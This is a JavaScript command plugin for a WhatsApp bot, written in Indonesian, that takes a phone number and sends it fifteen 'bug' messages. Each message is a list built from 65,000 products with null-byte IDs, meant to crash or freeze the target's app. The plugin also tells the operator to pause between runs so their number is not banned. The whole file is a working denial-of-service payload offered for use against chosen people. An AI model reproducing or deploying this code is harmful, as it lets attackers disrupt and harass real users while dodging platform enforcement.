let handler = async (m, { conn, text, usedPrefix, command, RaplyGwe }) => {
    if (!text) return RaplyGwe(`Format salah.\n\n*Penggunaan:*\n${usedPrefix + command} 628xxxx`);
    
    const target = text.replace(/[^0-9]/g, '');
    
    if (target.length < 10 || target.length > 15) {
        return RaplyGwe(`❌ Nomor tidak valid. Pastikan menggunakan kode negara (contoh: 628xxx).`);
    }

    const targetJid = `${target}@s.whatsapp.net`;

    await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        for (let i = 0; i < 15; i++) {
            await conn.relayMessage(targetJid, {
                listMessage: {
                    title: "Senju Script",
                    description: "x",
                    buttonText: "Bytes",
                    listType: 2,
                    productListInfo: {
                        productSections: [
                            {
                                title: "Satz",
                                products: [
                                    ...Array.from({ length: 65000 }, () => ({
                                        productId: "\0".repeat(1500)
                                    }))
                                ]
                            }
                        ],
                        headerImage: {
                            productId: "\n".repeat(100) + "Satz",
                            jpegThumbnail: null
                        },
                        businessOwnerJid: targetJid
                    },
                    footerText: "Xzd",
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        remoteJid: "status@broadcast"
                    }
                }
            }, { 
                noSelfSync: true 
            });
            
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
        if (RaplyGwe) {
            await RaplyGwe(`✅ *𝖲𝗎𝖼𝖼𝖾𝗌𝖾𝖽 𝖲𝖾𝗇𝖽 𝖡𝗎𝗀𝗌!*\n𝖲𝗎𝖼𝖼𝖾𝗌𝖾𝖽 𝖲𝖾𝗇𝖽 𝖯𝖺𝗒𝗅𝗈𝖺𝖽 𝖳𝗈 𝗍𝖺𝗋𝗀𝖾𝗍:\n\`${target}\`\n> ⁉️ Setelah bugs terkirim harap jeda agar nomer tidak ter benned`);
        }

    } catch (error) {
        console.error(error);
        
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        
        if (RaplyGwe) {
            await RaplyGwe(`❌ *Gagal Terkirim:*\n\`${error.message}\``);
        }
    }
}

handler.command = /^(delay)$/i;
handler.tags = ['bugs'];
handler.help = ['delay <nomor>'];

export default handler
